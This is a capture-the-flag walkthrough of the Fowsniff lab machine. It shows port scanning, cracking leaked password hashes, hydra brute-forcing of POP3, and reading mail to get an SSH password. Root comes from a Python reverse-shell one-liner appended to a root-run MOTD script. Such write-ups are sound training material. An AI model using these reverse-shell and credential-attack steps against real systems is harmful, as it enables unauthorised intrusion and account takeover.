#### 1. Scanning

```
nmap -Pn -A 10.10.211.152
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 05:35 EST
Nmap scan report for 10.10.211.152
Host is up (0.054s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) UIDL RESP-CODES USER AUTH-RESP-CODE TOP PIPELINING CAPA
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS SASL-IR OK more listed have post-login IMAP4rev1 AUTH=PLAINA0001 LITERAL+ capabilities IDLE Pre-login ID ENABLE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds
```

Open ports are 22,80 and 110/143 which are very interesting.

<br />

#### 2. Enumeration

I open the address in a browser and see a note with an interesting sentence:

`The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.`

So I type `"insite: @fowsniffcorp"`  in Google and get  two links, one of them is a pastebin with usernames and hashed passwords:

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

which cracked in crackstation correspond to:


```
8a28a94a588a95b80163709ab4313aa4:mailcall
ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
1dc352435fecca338acfd4be10984009:apples01
19f5af754c31f1e2651edde9250d69bb:skyler22
90dc16d47114aa13671c697fd506cf26:scoobydoo2
0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
4d6e42f56e127803285a0a7649b5ab11:orlando12
f7fd98d380735e859f8b2ffbbede5a7e:07011972
```
however `stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd` was not found, which after checking twitter account seems to be root.

<br />

#### 3. Accessing machine via POP3

Firstly, we should create `users.txt` with all found usernames:

```
cat users.txt 
mauer
mustikka
tegel
baksteen
seina
stone
mursten
parede
sciana
```

and also list of corresponding hashes `pass.txt`

```
cat pass.txt      
mailcall
bilbo101
apples01
skyler22
scoobydoo2
carp4ever
orlando12
07011972
```

Secondly, I use `hydra` contrary to metasploit recommended in challenge and run:

`hydra -L users.txt -P pass.txt 10.10.211.152 pop3`

which find a corresponding pair `seina:scoobydoo2`

<br />

Another step is to access server using netcat and pop3 protocol. I type:

`nc 10.10.211.152 110`

to login, then `user seina` and `pass scoobydoo2`

```
+OK Welcome to the Fowsniff Corporate Mail Server!
user seina
+OK
password scoobydoo2
-ERR Unknown command.
pass scoobydoo2
+OK Logged in.
list
```

There are two messages which could be read with `retr`

```
+OK 2 messages:
1 1622
2 1280
```

In first one, there is a ssh password

`The temporary password for SSH is "S1ck3nBluff+secureshell"`

while in the second, nothing useful in general except of three user names `devin`  `skyler` and `baksteen`

I tried all and third one works, giving access to machine.

<br />

#### 4. Escalation to root

Our user has no sudo permissions, there are no flags in his folder either. I tought about finding some suid files but it didn't give anything.

According to challenge's questions, I should pay attention in which group user is so I type `id`  andd see that he is in `users` group.

So I thought about finding all files which can be accessed by `users` 

```
baksteen@fowsniff:~$ find / -type f -group users 2>/dev/null
/opt/cube/cube.sh
/home/baksteen/.cache/motd.legal-displayed
/home/baksteen/Maildir/dovecot-uidvalidity
/home/baksteen/Maildir/dovecot.index.log
/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff
/home/baksteen/Maildir/dovecot-uidlist
/home/baksteen/Maildir/dovecot-uidvalidity.5aa21fac
```

and among lot of rubbish, there is an interesting one `/opt/cube/cube.sh` which we can execute and modify:

```
baksteen@fowsniff:/opt/cube$ ls -al cube.sh 
-rw-rwxr-- 1 parede users 851 Mar 11  2018 cube.sh
```

This file is related with `motd.d` which is displayed as root in the beginning of a session.

```
# cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#	# Fall back to using the very slow lsb_release utility
#	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
```

<br />

#### 5. Modifying `cube.sh` and getting shell

I add python liner in the end of `cube.sh`

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.170.47",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

and exit machine.

Right now, I run netcat in one terminal `sudo nc -lvnp 4444` and access machine once again `ssh baksteen@10.10.32.31`

Once I type password in that window, a new session as root will open in second:

```
sudo nc -lvnp 4444                                                      
listening on [any] 4444 ...
connect to [10.9.170.47] from (UNKNOWN) [10.10.32.31] 49264
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

# pwd
/
# ls /root
Maildir
flag.txt
# cat /root/flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.

# 
```
